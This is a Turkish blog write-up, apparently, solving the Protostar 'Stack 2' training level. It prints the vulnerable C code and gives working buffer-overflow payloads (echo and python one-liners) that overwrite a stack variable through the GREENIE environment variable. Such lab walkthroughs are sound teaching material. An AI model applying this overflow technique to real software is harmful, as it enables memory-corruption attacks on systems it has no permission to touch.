@@ -1,0 +1,55 @@
+<!doctype html><html lang=tr-tr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=/style.css><link rel=icon type=image/png href=/favicon.png><meta http-equiv=cache-control content=public><meta name=description content="Burada bir şey yok"><title>Stack 2 | Emir (0xF61)</title><script async src="https://www.googletagmanager.com/gtag/js?id=UA-135684308-2"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','UA-135684308-2');</script></head><body><nav><ul class=menu>|<li><a href=/>Ana Sayfa</a></li>|<li><a href=/yaz%C4%B1lar/>Yazılar</a></li>|<li><a href=/etiketler/>Etiketler</a></li>|<li><a href=/linkler/>Linkler</a></li>|<li><a href=/ara/>Ara</a></li>|</ul><hr></nav><div class=article-meta></div><span class=rtime>📖 2 dakika</span>
+<a href=..>↪ Protostar</a><h1 class=baslik>Stack 2</h1><main><h1 id=stack2-c>Stack2.c</h1><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
+{
+  <span style=color:#66d9ef>volatile</span> <span style=color:#66d9ef>int</span> modified;
+  <span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>64</span>];
+  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>variable;
+
+  variable <span style=color:#f92672>=</span> getenv(<span style=color:#e6db74>&#34;GREENIE&#34;</span>);
+
+  <span style=color:#66d9ef>if</span>(variable <span style=color:#f92672>==</span> NULL) {
+      errx(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;please set the GREENIE environment variable</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+  }
+
+  modified <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+
+  strcpy(buffer, variable);
+
+  <span style=color:#66d9ef>if</span>(modified <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x0d0a0d0a</span>) {
+      printf(<span style=color:#e6db74>&#34;you have correctly modified the variable</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+  } <span style=color:#66d9ef>else</span> {
+      printf(<span style=color:#e6db74>&#34;Try again, you got 0x%08x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, modified);
+  }
+
+}</code></pre></div><p><strong>Amaç:</strong> &ldquo;you have correctly got the variable to the right value&rdquo; satırını
+yazdırmak.</p><p>Bu seviyede de istediğimiz cümleyi yazdırabilmek için programın akışını bir
+şekilde değiştirmemiz gerekiyor. Önceki seviyede <em>modified</em> değişkeni
+<em>0x61626364</em> olması yeterken şimdi kabuktaki <strong>GREENIE</strong> değişkeni
+<strong>0x0d0a0d0a</strong> olmalı.</p><h2 id=programın-çalıştırılması>Programın çalıştırılması</h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ ./stack2
+stack2: please set the GREENIE environment variable</code></pre></div><p>Program çalıştırıldığı zaman bir önceki seviyedeki gibi herhangi bir input
+beklemeden, <em>GREENIE</em> değerini atamamızı istiyor. Bir önceki seviyeden farkı
+sadece programa doğrudan değil dolaylı yoldan <em>Kabuk değişkenini kullanarak</em>
+program akışını değiştirecek olmamız.</p><p>Bu seviyeyide aynı şekilde uzun bir text verdikten sonra modified değişkenini
+değiştirip programın akışını istediğimiz şekilde yönlendirebiliriz. Bunun için
+öncelikle bufferımızı doldurup <em>modified</em>&lsquo;in değerini değiştirebildiğimizi
+görelim.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># 64 Tane &#34;A&#34; karakteri</span>
+user@protostar:/opt/protostar/bin$ export GREENIE<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> ;
+./stack2
+Try again, you got 0x00000000
+
+<span style=color:#75715e># 64 Tane &#34;A&#34; karakteri + 4 tane B</span>
+user@protostar:/opt/protostar/bin$ export GREENIE<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&#39;</span> ; ./stack2
+Try again, you got 0x42424242</code></pre></div><p>Evet bu şekilde modified değişkenini istediğimiz şekilde değiştirebildiğimize
+göre bölümü bitirmek için istenilen değeri yazabilliriz.</p><h2 id=modified-değişkeninin-değiştirilmesi>Modified Değişkeninin Değiştirilmesi</h2><p>Koddaki <code>if(modified == 0x0d0a0d0a)</code> değerini Little Endiana göre yazdığım
+<code>0a0d0a0d</code> yani <code>\x0a\x0d\x0a\x0d</code> değerini yazmam gerektiğini görüyorum. Bunu
+iki şekilde basitçe payloadıma ekleyebilirim.</p><p>Echo ile &ldquo;<code>\x0a\x0d\x0a\x0d</code>&rdquo; değerini yazdırmak istersem, hex sayıları
+yazdırabilmem için <em>-e</em> parametresini ekliyorum.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ export GREENIE<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo -e <span style=color:#e6db74>&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0a\x0d\x0a\x0d&#39;</span><span style=color:#66d9ef>)</span>
+user@protostar:/opt/protostar/bin$ ./stack2
+you have correctly modified the variable</code></pre></div><p>Python ile:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ export GREENIE<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print 64*&#34;A&#34;+&#34;\x0a\x0d\x0a\x0d&#34;&#39;</span><span style=color:#66d9ef>)</span>
+user@protostar:/opt/protostar/bin$ ./stack2
+you have correctly modified the variable</code></pre></div></main><footer><hr><a href=/index.xml>Feed</a></footer></body></html>
